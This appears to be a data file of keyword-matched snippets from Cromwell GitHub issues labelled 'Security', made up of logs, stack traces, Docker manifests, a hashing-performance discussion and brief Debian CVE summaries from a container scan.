Security,"4842beb\"",\""os\"":\""linux\"",\""parent\"":\""633c756fc95cb19efd13b84a949066c65f5b6683d0922d1980b6a19deb855fa0\"",\""throwaway\"":true}""; },; {; ""v1Compatibility"": ""{\""id\"":\""633c756fc95cb19efd13b84a949066c65f5b6683d0922d1980b6a19deb855fa0\"",\""created\"":\""2017-08-07T23:50:27.303876981Z\"",\""container_config\"":{\""Cmd\"":[\""/bin/sh -c #(nop) ADD file:fb17197475bb59bfb365c41f28d4bc15134b8dcb8907819e7be54bce53328c03 in / \""]}}""; }; ],; ""schemaVersion"": 1,; ""signatures"": [; {; ""header"": {; ""jwk"": {; ""crv"": ""P-256"",; ""kid"": ""4DPT:XWGC:ESR7:JVJY:2RON:CMML:IXIT:QXQ5:LGLL:LPJF:PWDL:AJSO"",; ""kty"": ""EC"",; ""x"": ""BjSTZs2e-5wP1bu4deBughI6YALM3vbLbZL-CGBRcmM"",; ""y"": ""Qj5Fr4Z1BQRe4EXMe-75dOkvIDzP-0u5cks8my7hkCA""; },; ""alg"": ""ES256""; },; ""signature"": ""ewZ_2lh2-uWSpw5tcprbhoFvjLoxGqsI06YSlvq4w2eXB5EEpMsk5Jo6WYRBeYeJxv0vnoe7SbN_1qarBAU9uQ"",; ""protected"": ""eyJmb3JtYXRMZW5ndGgiOjIxOTUsImZvcm1hdFRhaWwiOiJmUSIsInRpbWUiOiIyMDE3LTExLTA2VDE2OjE2OjE4WiJ9""; }; ]; }; ```. ```bash; $ curl -i -s -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' https://gcr.io/v2/google-containers/ubuntu-slim/manifests/0.14; HTTP/1.1 200 OK; Docker-Distribution-API-Version: registry/2.0; Content-Type: application/vnd.docker.distribution.manifest.v2+json; Content-Length: 529; Docker-Content-Digest: sha256:1d5c0118358fc7651388805e404fe491a80f489bf0e7c5f8ae4156250d6ec7d8; Date: Mon, 06 Nov 2017 16:16:59 GMT; Server: Docker Registry; X-XSS-Protection: 1; mode=block; X-Frame-Options: SAMEORIGIN; Alt-Svc: quic="":443""; ma=2592000; v=""41,39,38,37,35"". {; ""schemaVersion"": 2,; ""mediaType"": ""application/vnd.docker.distribution.manifest.v2+json"",; ""config"": {; ""mediaType"": ""application/vnd.docker.container.image.v1+json"",; ""size"": 1528,; ""digest"": ""sha256:fba1281b32ffd9048881f99d8de0218c71552c4c91f09844b4b189b16e51cdca""; },; ""layers"": [; {; ""mediaType"": ""application/vnd.docker.image.rootfs.diff.tar.gzip"",; ""size"": 18278657,; ""digest"": ""sha256:1c4816548d6a2a08f89c304bf09503e791a338c4be90629610152124c7285d3f""; }; ]; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2826:5099,XSS,XSS-Protection,5099,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2826,1,['XSS'],['XSS-Protection']
Security,"5-9791-9011a2fae80f/call-batch_for_variantcall -o /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/stdout -e /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrEl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:4830,hash,hash,4830,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['hash'],['hash']
Security,500 Internal error when trying to get task hash for call caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/600:43,hash,hash,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/600,1,['hash'],['hash']
Security,"5346 . @cmarkello, @illusional, I am sorry that I insisted that `path+modtime` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1317,hash,hash,1317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hash']
Security,"5a79a-1369-4dc1-8f41-4180d7b3c1ab.0000.g.vcf.gz.tbi"". Whoever picks up this ticket can talk to me about specifics and why we think its an 85MB issue. ```; 2016-06-02 00:18:27,540 cromwell-system-akka.actor.default-dispatcher-341 INFO - WorkflowActor [UUID(fa18fa5f)]: persisting status of RotateGVCFIndex to Running.; 2016-06-01T20:19:00.527-0400: 104257.028: [GC (Allocation Failure) [PSYoungGen: 1821155K->270322K(1864192K)] 4006446K->2894561K(7456768K), 0.1718483 secs] [Times: user=1.22 sys=0.01, real=0.17 secs] ; 2016-06-02 00:19:39,491 ForkJoinPool-3-worker-7 ERROR - Exception not convertible into handled response; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method) ~[na:1.8.0_72]; at java.net.SocketInputStream.socketRead(SocketInputStream.java:116) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:170) ~[na:1.8.0_72]; at java.net.SocketInputStream.read(SocketInputStream.java:141) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.readFully(InputRecord.java:465) ~[na:1.8.0_72]; at sun.security.ssl.InputRecord.read(InputRecord.java:503) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930) ~[na:1.8.0_72]; at sun.security.ssl.AppInputStream.read(AppInputStream.java:105) ~[na:1.8.0_72]; at java.io.BufferedInputStream.fill(BufferedInputStream.java:246) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read1(BufferedInputStream.java:286) ~[na:1.8.0_72]; at java.io.BufferedInputStream.read(BufferedInputStream.java:345) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704) ~[na:1.8.0_72]; at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536) ~[na:1.8.0_72]; at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/932:2288,secur,security,2288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/932,1,['secur'],['security']
Security,"6); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:316); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 403 Forbidden; POST https://storage.googleapis.com/upload/storage/v1/b/xxx/o?projection=full&userProject=xxx&uploadType=multipart; {; ""code"" : 403,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project."",; ""reason"" : ""forbidden""; } ],; ""message"" : ""xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.""; }; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:150); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:555); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:475); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:592); 	at com.google.cloud.storage.spi.v1.H",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594:3483,access,access,3483,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594,2,['access'],['access']
Security,"67] [info] Running with database db.url = jdbc:hsqldb:mem:6713284f-67ff-4eb9-9fd6-3fde0a4cc0ce;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:36:10,85] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-08-30 17:36:10,87] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-08-30 17:36:11,02] [info] Running with database db.url = jdbc:hsqldb:mem:5893545c-e081-4c3d-827d-000af3765fc4;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:36:11,72] [info] Slf4jLogger started; Exception in thread ""main"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Workflow source does not exist: does-not-exist.wdl; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:219); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:219); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:215); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:56); 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); ```; Command-line tools are subject to usability standards identical to those of our other user interfaces. Unless the intended audience of this tool is Cromwell engineers, the stacktrace information is ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4060:1096,validat,validateRunArguments,1096,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4060,1,['validat'],['validateRunArguments']
Security,"73)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73)""; },; {; causedBy: [ ],; message: ""wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27)""; },; {; causedBy: [ ],; message: ""wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:98)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157)""; },; {; causedBy: [ ],; message: ""scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304)""; },; {; causedBy: [ ],; message: ""scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37)""; },; {; causedBy: [ ],; message: ""scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60)""; },; {; causedBy: [ ],; message: ""akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55)""; },; {; causedBy: [ ],; message: ""akka.dispatch.BatchingExecu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143:1904,validat,validateWdlNamespace,1904,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143,1,['validat'],['validateWdlNamespace']
Security,74); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74); at io.grpc.netty.shaded.io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30); ... 1 common frames omitted; Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:388); at java.base/sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:271); at java.base/sun.security.validator.Validator.validate(Validator.java:256); at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.Reference,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:7152,secur,security,7152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['secur'],['security']
Security,74); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); at wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); at wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); at wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:83); at wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:13); at scala.util.Either$RightProjection.flatMap(Either.scala:702); at cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); at cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); at cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); at languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:49); at scala.util.Either.flatMap(Either.scala:338); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:40); at womtool.input.WomGraphMaker$.getBundle(WomGraphMaker.scala:22); at womtool.validate.Validate$.validate(Validate.scala:14); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:44); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:125); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:130); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:18); at scala.Function0.apply$mcV$sp(Function0.scala:34); at scala.Function0.apply$mcV$sp$(Function0.scala:34); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); at scala.App.$anonfun$main$1$adapted(App.scala:76); at scala.collection.immutable.List.foreach(List.scala:389); at scala.App.main(App.scala:76); at scala.App.main$(App.scala:74); at womtool.WomtoolMain$.main(WomtoolMain.scala:18); at womtool.WomtoolMain.main(WomtoolMain.scala); ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3977:5595,validat,validate,5595,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3977,4,"['Validat', 'validat']","['Validate', 'validate']"
Security,"7:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1749,access,access,1749,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:effectiveCallCachingMode|ReadAndWriteCache|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:effectiveCallCachingMode|ReadAndWriteCache|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:allowResultReuse|true|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:6403,hash,hashes,6403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"7f71b554), I am recommending we just delete the test instead of spending any more time on this. ```; > gcloud beta lifesciences operations describe projects/1005074806481/locations/us-central1/operations/8650136336352694244 --format=json; {; ""done"": true,; ""error"": {; ""code"": 9,; ""message"": ""Execution failed: generic::failed_precondition: while running \""-c /bin/bash /cromwell_root/gcs_localization.sh\"": unexpected exit status 1 was not ignored""; },; ""metadata"": {; ""@type"": ""type.googleapis.com/google.cloud.lifesciences.v2beta.Metadata"",; ""createTime"": ""2023-12-04T20:36:45.056562Z"",; ""endTime"": ""2023-12-04T21:10:43.697318162Z"" # <- WTF!!; }; [...]; ```. ```; Long duration; Warning: arning] Using a password on the command line interface can be insecure.; +--------------------------------------+-----------------+----------------------------+----------------------------+; | name | RUNTIME_MINUTES | start | end |; +--------------------------------------+-----------------+----------------------------+----------------------------+; | localize_file_larger_than_disk_space | 35 | 2023-12-05 01:01:27.836000 | 2023-12-05 01:37:10.789000 |; | lots_of_inputs | 32 | 2023-12-05 01:02:03.292000 | 2023-12-05 01:34:26.490000 |; | draft3_call_cache_capoeira | 27 | 2023-12-05 01:03:01.338000 | 2023-12-05 01:30:34.171000 |; ```. ```; Late finishers; Warning: arning] Using a password on the command line interface can be insecure.; +------------------------------------------+-----------------+----------------------------+----------------------------+; | name | runtime_minutes | start | END |; +------------------------------------------+-----------------+----------------------------+----------------------------+; | restart_while_failing | 16 | 2023-12-05 01:33:04.179000 | 2023-12-05 01:49:36.795000 |; | localize_file_larger_than_disk_space | 35 | 2023-12-05 01:01:27.836000 | 2023-12-05 01:37:10.789000 |; | lots_of_inputs | 32 | 2023-12-05 01:02:03.292000 | 2023-12-05 01:34:26.490000 |; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7330:2094,password,password,2094,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7330,1,['password'],['password']
Security,"8-13347: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; mpatch.c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; https://security-tracker.debian.org/tracker/CVE-2017-17458; -----------------------------------------; CVE-2017-12562: [High] ; Found in: libsndfile [1.0.27-3]; Fixed By: ; Heap-based Buffer Overflow in the psf_binheader_writef function in common.c in libsndfile through 1.0.28 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-12562; -----------------------------------------; CVE-2018-1000001: [High] ; Found in: glibc [2.24-11+deb9u4]; Fixed By: ; In glibc 2.26 and earlier there is confusion in the usage of getcwd() by realpath() which can be used to write before the destination buffer leading to a buffer underflow and potential code execution.; https://security-tracker.debian.org/tracker/CVE-2018-1000001; -----------------------------------------; CVE-2016-2779: [High] ; Found in: util-linux [2.29.2-1+deb9u1]; Fixed By: ; runuser in util-linux allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.; https://security-tracker.debian.org/tracker/CVE-2016-2779; -----------------------------------------; CVE-2017-14062: [High] ; Found in: libidn [1.33-1]; Fixed By: ; Integer overflow in the decode_digit function in p",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:2290,attack,attackers,2290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,1,['attack'],['attackers']
